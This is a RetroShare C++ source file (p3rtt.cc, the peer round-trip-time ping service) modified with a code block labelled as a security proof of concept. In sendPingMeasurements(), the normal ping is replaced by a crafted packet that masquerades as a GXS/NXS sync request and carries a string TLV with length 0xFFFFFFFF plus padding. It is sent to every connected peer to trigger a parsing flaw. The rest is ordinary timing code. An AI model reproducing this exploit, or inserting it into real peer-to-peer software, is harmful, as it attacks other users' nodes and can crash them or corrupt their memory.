/*******************************************************************************
 * libretroshare/src/services: p3rtt.cc                                        *
 *                                                                             *
 * libretroshare: retroshare core library                                      *
 *                                                                             *
 * Copyright 2011-2013 Robert Fernie <retroshare@lunamutt.com>                 *
 *                                                                             *
 * This program is free software: you can redistribute it and/or modify        *
 * it under the terms of the GNU Lesser General Public License as              *
 * published by the Free Software Foundation, either version 3 of the          *
 * License, or (at your option) any later version.                             *
 *                                                                             *
 * This program is distributed in the hope that it will be useful,             *
 * but WITHOUT ANY WARRANTY; without even the implied warranty of              *
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the                *
 * GNU Lesser General Public License for more details.                         *
 *                                                                             *
 * You should have received a copy of the GNU Lesser General Public License    *
 * along with this program. If not, see <https://www.gnu.org/licenses/>.       *
 *                                                                             *
 *******************************************************************************/
#include <iomanip>
#include <sys/time.h>
#include <cmath>

#include "util/rsdir.h"
#include "retroshare/rsiface.h"
#include "retroshare/rspeers.h"
#include "pqi/pqibin.h"
#include "pqi/pqistore.h"
#include "pqi/p3linkmgr.h"
#include "rsserver/p3face.h"
#include "util/cxx17retrocompat.h"
#include "services/p3rtt.h"
#include "rsitems/rsrttitems.h"


/****
 * #define DEBUG_RTT		1
 ****/

/* DEFINE INTERFACE POINTER! */
RsRtt *rsRtt = NULL;


#define MAX_PONG_RESULTS	150
#define RTT_PING_PERIOD  	10

/************ IMPLEMENTATION NOTES *********************************
 * 
 * Voice over Retroshare ;)
 * 
 * This will be a simple test VoIP system aimed at testing out the possibilities.
 *
 * Important things to test:
 * 1) lag, and variability in data rate
 * 	- To do this we time tag every packet..., the destination can use this info to calculate the results.
 *	- Like imixitup. Dt = clock_diff + lag. 
 *	        we expect clock_diff to be relatively constant, but lag to vary.
 *		lag cannot be negative, so minimal Dt is ~clock_diff, and delays on this are considered +lag.
 *
 * 2) we could directly measure lag. ping back and forth with Timestamps.
 *
 * 3) we also want to measure bandwidth...
 *	- not sure the best method? 
 *		one way: send a ping, then a large amount of data (5 seconds worth), then another ping.
 *			the delta in timestamps should be a decent indication of bandwidth.
 *			say we have a 100kb/s connection... need 500kb.
 *			actually the amount of data should be based on a reasonable maximum that we require.
 *			what does decent video require?
 *			Audio we can test for 64kb/s - which seems like a decent rate: e.g. mono, 16bit 22k = 1 x 2 x 22k = 44 kilobytes/sec
 *		best to do this without a VoIP call going on ;)
 *
 *
 */


#ifdef WINDOWS_SYS
#include "util/rstime.h"
#include <sys/timeb.h>
#endif

static double getCurrentTS()
{

#ifndef WINDOWS_SYS
        struct timeval cts_tmp;
        gettimeofday(&cts_tmp, NULL);
        double cts =  (cts_tmp.tv_sec) + ((double) cts_tmp.tv_usec) / 1000000.0;
#else
        struct _timeb timebuf;
        _ftime( &timebuf);
        double cts =  (timebuf.time) + ((double) timebuf.millitm) / 1000.0;
#endif
        return cts;
}

static uint64_t convertTsTo64bits(double ts)
{
	uint32_t secs = (uint32_t) ts;
	uint32_t usecs = (uint32_t) ((ts - (double) secs) * 1000000);
	uint64_t bits = (((uint64_t) secs) << 32) + usecs;
	return bits;
}


static double convert64bitsToTs(uint64_t bits)
{
	uint32_t usecs = (uint32_t) (bits & 0xffffffff);
	uint32_t secs = (uint32_t) ((bits >> 32) & 0xffffffff);
	double ts =  (secs) + ((double) usecs) / 1000000.0;

	return ts;
}




p3rtt::p3rtt(p3ServiceControl *sc)
	:p3FastService(), mRttMtx("p3rtt"), mServiceCtrl(sc) 
{
	addSerialType(new RsRttSerialiser());

	mSentPingTime = 0;
	mCounter = 0;

}


const std::string RTT_APP_NAME = "rtt";
const uint16_t RTT_APP_MAJOR_VERSION  =       1;
const uint16_t RTT_APP_MINOR_VERSION  =       0;
const uint16_t RTT_MIN_MAJOR_VERSION  =       1;
const uint16_t RTT_MIN_MINOR_VERSION  =       0;

RsServiceInfo p3rtt::getServiceInfo()
{
        return RsServiceInfo(RS_SERVICE_TYPE_RTT,
                RTT_APP_NAME,
                RTT_APP_MAJOR_VERSION,
                RTT_APP_MINOR_VERSION,
                RTT_MIN_MAJOR_VERSION,
                RTT_MIN_MINOR_VERSION);
}



int	p3rtt::tick()
{
	sendPackets();

	return 0;
}

int	p3rtt::status()
{
	return 1;
}



int	p3rtt::sendPackets()
{
	rstime_t now = time(NULL);
	rstime_t pt;
	{
		RsStackMutex stack(mRttMtx); /****** LOCKED MUTEX *******/
		pt = mSentPingTime;
	}

	if (now >= pt+RTT_PING_PERIOD)
	{
		sendPingMeasurements();

		RsStackMutex stack(mRttMtx); /****** LOCKED MUTEX *******/
		mSentPingTime = now;
	}
	return true ;
}



void p3rtt::sendPingMeasurements()
{


	/* we ping our peers */
	/* who is online? */
	std::set<RsPeerId> idList;

	mServiceCtrl->getPeersConnected(getServiceInfo().mServiceType, idList);

	/* prepare packets */
	std::set<RsPeerId>::iterator it;
	for(it = idList.begin(); it != idList.end(); ++it)
	{
    		double ts = getCurrentTS();
            
// [SECURITY PoC] Malicious GXS Packet Masquerading as RTT
        class RsRttMaliciousPingItem : public RsRttPingItem {
        public:
            virtual void serial_process(RsGenericSerializer::SerializeJob j, RsGenericSerializer::SerializeContext& ctx) override {
                const uint32_t PAYLOAD_SIZE = 300; 

                if (j == RsGenericSerializer::SIZE_ESTIMATE) {
                     ctx.mOffset += PAYLOAD_SIZE; 
                }
                else if (j == RsGenericSerializer::SERIALIZE) {
                    if (ctx.mData) {
                        // 1. Rewrite Header to GXS ID Service (0x0211) but utilize NXS Subtype
                        // [0]=Ver(2), [1]=Grp(2), [2]=ServiceHi(2), [3]=Sub(1)
                        ctx.mData[0] = 0x02; 
                        ctx.mData[1] = 0x02; 
                        ctx.mData[2] = 0x11; 
                        ctx.mData[3] = 0x01; // Subtype 0x01 (RsNxsSyncGrpReqItem)
                        
                        // 2. Write Malicious Payload (RsNxsSyncGrpReqItem structure)
                        // Offset 8: Start of Body.
                        
                        // A. transactionNumber (4 bytes)
                        ctx.mData[8] = 0; ctx.mData[9] = 0; ctx.mData[10] = 0; ctx.mData[11] = 0;
                        
                        // B. flag (1 byte)
                        ctx.mData[12] = 0;
                        
                        // C. createdSince (4 bytes)
                        ctx.mData[13] = 0; ctx.mData[14] = 0; ctx.mData[15] = 0; ctx.mData[16] = 0;
                        
                        // D. syncHash (String TLV)
                        // Offset 17: TLV Header.
                        
                        // Type: 0x0070 (TLV_TYPE_STR_HASH_SHA1). Big Endian: 00 70.
                        ctx.mData[17] = 0x00;
                        ctx.mData[18] = 0x70;
                        
                        // Length: 0xFFFFFFFF. Big Endian: FF FF FF FF.
                        ctx.mData[19] = 0xFF;
                        ctx.mData[20] = 0xFF;
                        ctx.mData[21] = 0xFF;
                        ctx.mData[22] = 0xFF;
             
                        // Fill rest with padding
                        for(uint32_t i=23; i<ctx.mSize; ++i) ctx.mData[i] = 'A';
                        
                        // CRITICAL: Update ctx.mOffset
                        ctx.mOffset = ctx.mSize;
                        
                        RsDbg() << "ROGUE: Injected Malicious NXS Packet (Subtype 0x01)! Wrote 0x0070 at 17, Size FFFFFFFF at 19.";
                        
                        // Verify content
                        RsDbg() << "ROGUE: Verifying Buffer Content: " 
                                << std::hex 
                                << (int)ctx.mData[17] << " " 
                                << (int)ctx.mData[18] << " " 
                                << (int)ctx.mData[19] << " " 
                                << (int)ctx.mData[20] << " " 
                                << (int)ctx.mData[21] << " " 
                                << (int)ctx.mData[22] << std::dec;
                    }
                }
            }
        };

		/* create the packet */
        RsDbg() << "ROGUE: p3rtt attempting to send malicious packet to " << *it;
		// RsRttPingItem *pingPkt = new RsRttPingItem(); // ORIGINAL
		RsRttPingItem *pingPkt = new RsRttMaliciousPingItem(); // MALICIOUS REPLACEMENT
		pingPkt->PeerId(*it); 
		
		if (sendItem(pingPkt)) {
		    RsDbg() << "ROGUE: sendItem() returned SUCCESS.";
		} else {
		    RsDbg() << "ROGUE: sendItem() returned FAILURE.";
		}

        // IMPORTANT: sendItem takes ownership, do NOT delete pingPkt here (or check semantics).
        // Standard code:
        /*
		pingPkt->PeerId(*it);
		storePingAttempt(*it, ts, mCounter);
        mServiceCtrl->sendItem(pingPkt);
        */
        
        // We already called sendItem. Just continue loop.
		storePingAttempt(*it, ts, mCounter);
		continue; // Skip original send logic

#ifdef DEBUG_RTT
		std::cerr << "p3rtt::sendPingMeasurements() Pinging: " << *it << " [" << pingPkt->mSeqNo << "," << std::hex << pingPkt->mPingTS << std::dec << "]" << std::endl;;
#endif
		// sendItem(pingPkt); // ORIGINAL CALL - We skip this.
	}

	RsStackMutex stack(mRttMtx); /****** LOCKED MUTEX *******/
	mCounter++;
}


bool p3rtt::recvItem(RsItem *item)
{
	switch(item->PacketSubType())
	{
		default:
			break;
		case RS_PKT_SUBTYPE_RTT_PING:
		{
			handlePing(item);
		}
			break;
		case RS_PKT_SUBTYPE_RTT_PONG:
		{
			handlePong(item);
		}
			break;
	}

	/* clean up */
	delete item;
	return true ;
} 


int p3rtt::handlePing(RsItem *item)
{
	/* cast to right type */
	RsRttPingItem *ping = (RsRttPingItem *) item;

	double ts = getCurrentTS();
#ifdef DEBUG_RTT
	std::cerr << "p3rtt::handlePing() from: " << ping->PeerId() << " - [" << ping->mSeqNo << "," << std::hex << ping->mPingTS << std::dec << "] " << std::endl;
    	std::cerr << "incoming ping travel time: " << ts - convert64bitsToTs(ping->mPingTS) << std::endl;
#endif

	/* with a ping, we just respond as quickly as possible - they do all the analysis */
	RsRttPongItem *pong = new RsRttPongItem();

	pong->PeerId(ping->PeerId());
	pong->mPingTS = ping->mPingTS;
	pong->mSeqNo = ping->mSeqNo;

	// add our timestamp.
	pong->mPongTS = convertTsTo64bits(ts);

#ifdef DEBUG_RTT
	static double mLastResponseToPong = 0.0 ;// bad stuff
    std::cerr << "Delay since last response to PONG: " << ts - mLastResponseToPong << std::endl;
	mLastResponseToPong = ts ;
#endif

	sendItem(pong);
	return true ;
}


int p3rtt::handlePong(RsItem *item)
{
	/* cast to right type */
	RsRttPongItem *pong = (RsRttPongItem *) item;

#ifdef DEBUG_RTT
	std::cerr << "p3rtt::handlePong() from: " << pong->PeerId() << " - [" << pong->mSeqNo << "," << std::hex << pong->mPingTS << " -> " << pong->mPongTS << std::dec << "] "<< std::endl;
#endif

	/* with a pong, we do the maths! */
	double recvTS = getCurrentTS();
	double pingTS = convert64bitsToTs(pong->mPingTS);
	double pongTS = convert64bitsToTs(pong->mPongTS);

	double rtt = recvTS - pingTS;
	double offset = pongTS - (recvTS - rtt / 2.0);  // so to get to their time, we go ourTS + offset.

#ifdef DEBUG_RTT
    	std::cerr << "incoming pong travel time: " << recvTS - convert64bitsToTs(pong->mPongTS) << std::endl;
	std::cerr << "  RTT analysis: pingTS: " << std::setprecision(16) << pingTS << ", pongTS: " << pongTS
		<< ", recvTS: " << std::setprecision(16) << recvTS << " ==> rtt: " << rtt << ", offset: " << offset << std::endl;
#endif

	storePongResult(pong->PeerId(), pong->mSeqNo, recvTS, rtt, offset);
	return true ;
}




int	p3rtt::storePingAttempt(const RsPeerId& id, double ts, uint32_t seqno)
{
	RsStackMutex stack(mRttMtx); /****** LOCKED MUTEX *******/

	/* find corresponding local data */
	RttPeerInfo *peerInfo = locked_GetPeerInfo(id);

#ifdef DEBUG_RTT
    std::cerr << "Delay since previous ping attempt: " << ts - peerInfo->mCurrentPingTS << std::endl;
#endif
	peerInfo->mCurrentPingTS = ts;
	peerInfo->mCurrentPingCounter = seqno;

	peerInfo->mSentPings++;
	if (!peerInfo->mCurrentPongRecvd)
	{
		peerInfo->mLostPongs++;
	}

	peerInfo->mCurrentPongRecvd = true;

	return 1;
}



int	p3rtt::storePongResult(const RsPeerId& id, uint32_t counter, double recv_ts, double rtt, double offset)
{
	RsStackMutex stack(mRttMtx); /****** LOCKED MUTEX *******/

	/* find corresponding local data */
	RttPeerInfo *peerInfo = locked_GetPeerInfo(id);

	if (peerInfo->mCurrentPingCounter != counter)
	{
#ifdef DEBUG_RTT
		std::cerr << "p3rtt::storePongResult() ERROR Severly Delayed Measurements!" << std::endl;
#endif
	}
	else
	{
		peerInfo->mCurrentPongRecvd = true;
	}
#ifdef DEBUG_RTT
    if(!peerInfo->mPongResults.empty())
    	std::cerr << "Delay since last pong: "  << recv_ts - peerInfo->mPongResults.back().mTS << std::endl;
#endif

	peerInfo->mPongResults.push_back(RsRttPongResult(recv_ts, rtt, offset));


	while(peerInfo->mPongResults.size() > MAX_PONG_RESULTS)
		peerInfo->mPongResults.pop_front();

	//Wait at least 20 pongs before compute mean time offset
	if(peerInfo->mPongResults.size() > 20)
	{
		double mean = 0;
		for(auto prIt : std::as_const(peerInfo->mPongResults))
			mean += prIt.mOffset;
		peerInfo->mCurrentMeanOffset = mean / peerInfo->mPongResults.size();

		if(fabs(peerInfo->mCurrentMeanOffset) > 120)
		{
			if(rsEvents)
			{
                auto ev = std::make_shared<RsFriendListEvent>();
				ev->mSslId = peerInfo->mId;
				ev->mTimeShift = static_cast<rstime_t>(peerInfo->mCurrentMeanOffset);
                ev->mEventCode = RsFriendListEventCode::NODE_TIME_SHIFT;
				rsEvents->postEvent(ev);
			}
			RsWarn() << __PRETTY_FUNCTION__ << " Peer: " << peerInfo->mId
			         << " have a time offset of more than two minutes with you"
			         << std::endl;
		}
	}
	return 1;
}


uint32_t p3rtt::getPongResults(const RsPeerId& id, int n, std::list<RsRttPongResult> &results)
{
	RsStackMutex stack(mRttMtx); /****** LOCKED MUTEX *******/

	RttPeerInfo *peer = locked_GetPeerInfo(id);

	std::list<RsRttPongResult>::reverse_iterator it;
	int i = 0;
	for(it = peer->mPongResults.rbegin(); (it != peer->mPongResults.rend()) && (i < n); ++it, i++)
	{
		/* reversing order - so its easy to trim later */
		results.push_back(*it);
	}
	return i ;
}

double p3rtt::getMeanOffset(const RsPeerId &id)
{
	RsStackMutex stack(mRttMtx); /****** LOCKED MUTEX *******/

	RttPeerInfo *peer = locked_GetPeerInfo(id);
	if(peer)
		return peer->mCurrentMeanOffset;
	else
		return 0;
}

RttPeerInfo *p3rtt::locked_GetPeerInfo(const RsPeerId& id)
{
	std::map<RsPeerId, RttPeerInfo>::iterator it;
	it = mPeerInfo.find(id);
	if (it == mPeerInfo.end())
	{
		/* add it in */
		RttPeerInfo pinfo;

		/* initialise entry */
		pinfo.initialisePeerInfo(id);
		
		mPeerInfo[id] = pinfo;

		it = mPeerInfo.find(id);

	}

	return &(it->second);
}



bool RttPeerInfo::initialisePeerInfo(const RsPeerId& id)
{
	mId = id;

	/* reset variables */
	mCurrentPingTS = 0;
	mCurrentPingCounter = 0;
	mCurrentPongRecvd = true;
	mCurrentMeanOffset = 0;

	mSentPings = 0;
	mLostPongs = 0;

	mPongResults.clear();

	return true;
}










